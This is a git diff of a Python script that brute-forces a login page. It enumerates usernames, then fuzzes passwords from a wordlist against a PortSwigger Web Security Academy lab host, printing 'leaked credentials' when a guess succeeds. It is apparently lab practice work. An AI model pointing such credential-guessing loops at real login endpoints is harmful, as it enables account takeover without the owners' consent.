@@ -15,15 +15,16 @@ custom_theme = Theme({
     "warning": "yellow",
     "danger": "bold red"
 })
-console = Console(theme=custom_theme)
+
 
 
 
 
 @app.command()
 def run():
+    console = Console(theme=custom_theme)
     invalid_username = 'Invalid username or password.'
-    lab_id= '0ad700fd03705e4381fe48d5005b0048'
+    lab_id= '0a32002b0317bcc182258360002b0034'
     
     username_found = 'user'
     password='709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002709d49e4-a272-11ee-8c90-0242ac120002'
@@ -53,30 +54,32 @@ def run():
                 response_text = response.text
                # print(response.text)
                 if invalid_username not in response_text:
-                    console.print(f'\npossible username found: {username}', style="warning")
-                    username_found = username
+                    username_found = username.strip()
+                    console.print(f'\npossible username found', style="warning")
+                    console.print(f'{username_found}', style='danger')
                     progress.update(task, advance=file_length)
-                    user_found=True
                     break
                     
 
                 
                 progress.update(task, advance=1)
     invalid_username='Invalid username or password'
+    console = Console(theme=custom_theme)
     with open("passwords.txt", "r") as file:
         file_lines = file.readlines()
         file_length = len(file_lines)
         with Progress() as progress:
             task = progress.add_task(f"Password fuzzing for {username_found} ...", total=file_length) 
             for password in file_lines:
+                password=password.strip()
                 #print(username)
         
                 if not password:
                     break
                 response = requests.post(
                                         f"https://{lab_id}.web-security-academy.net/login", data= {
-                                            "username" : username_found.strip(),
-                                            "password": password.strip()
+                                            "username" : username_found,
+                                            "password": password
                                         }, headers={
                                             "host": f"{lab_id}.web-security-academy.net",
                                             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
@@ -87,9 +90,10 @@ def run():
                 response_text = response.text
             # print(response.text)
                 if invalid_username not in response_text:
-                    console.print(f'\n leaked credentials {username_found.strip()}:{password.strip()}', style="info")
+                    console.print(f'\nleaked credentials', style='warning')
+                    console.print(f'{username_found} : {password}', style="danger")
                     progress.update(task, advance=file_length)
-                    user_found=True
+                    #print(f'{password}')
                     break
 
                 
